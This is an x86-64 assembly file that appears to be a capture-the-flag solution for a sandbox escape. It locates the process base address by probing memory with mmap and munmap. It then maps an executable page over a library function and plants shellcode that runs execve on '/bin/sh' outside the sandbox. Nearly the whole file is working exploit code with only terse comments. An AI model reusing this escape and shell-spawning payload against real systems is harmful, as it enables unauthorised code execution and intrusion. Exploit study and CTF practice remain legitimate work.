BITS 64
ORG 0

_start:
  xor r9d, r9d
  mov r8, -1
  mov r10d, 0x22                ; MAP_PRIVTE | MAP_ANONYMOUS

  ; prepare "/bin/sh"
  mov esi, 0x1000
  mov rdi, 0xdead0000
  call mmap
  mov dword [rdi], 0x6e69622f   ; /bin
  mov dword [rdi+4], 0x68732f   ; /sh

  ; leak proc bsae
  call leak

  ; overwrite std::hex(std::ios_base &)
  mov rdi, rax
  call pwn

  ; ignite!
  call exit

;; run shellcode outside sandbox
pwn:
  mov esi, 0x1000
  add rdi, 0x2000
  call mmapForce
  ; copy shellcode
  lea rdi, [rdi + 0x124]
  mov rsi, shellcode
  mov ecx, 0x40
  cld
  .@LpCopy:
  lodsb
  stosb
  dec ecx
  test ecx, ecx
  jnz .@LpCopy
  ret

;; leak proc base
leak:
  ; base = 0x555555000000
  mov rbp, 0x555555000000

  ; for(size = 0x100000000; size >= 0x100; size /= 0x10) {
  mov r12, 0x100000000
  jmp .@LpSizeCmp
  .@LpSize:

  ; for(address = base; ; address += size) {
  mov r11, rbp
  .@LpAddr:
  mov rsi, r12
  mov rdi, r11
  call mmap
  test rax, rax
  jnz .@LpAddrBreak
  call munmap
  add r11, r12
  jmp .@LpAddr
  ; }
  .@LpAddrBreak:
  mov rbp, r11

  shr r12, 4
  .@LpSizeCmp:
  cmp r12, 0x100
  jge .@LpSize
  ; }

  mov rax, rdi
  ret

mmapForce:
  xor r9d, r9d
  mov r8, -1
  mov r10d, 0x32                ; MAP_PRIVTE | MAP_ANONYMOUS | MAP_FIXED
  mov edx, 7                    ; RWX
  mov eax, 9
  syscall
  ret

mmap:
  mov edx, 3                    ; RW-
  mov eax, 9
  syscall
  ret

munmap:
  mov eax, 11
  syscall
  ret

exit:
  xor edi, edi
  mov eax, 60
  syscall
  hlt

shellcode:
  xor edx, edx
  xor esi, esi
  mov rdi, 0xdead0000
  mov eax, 59
  syscall
  int3
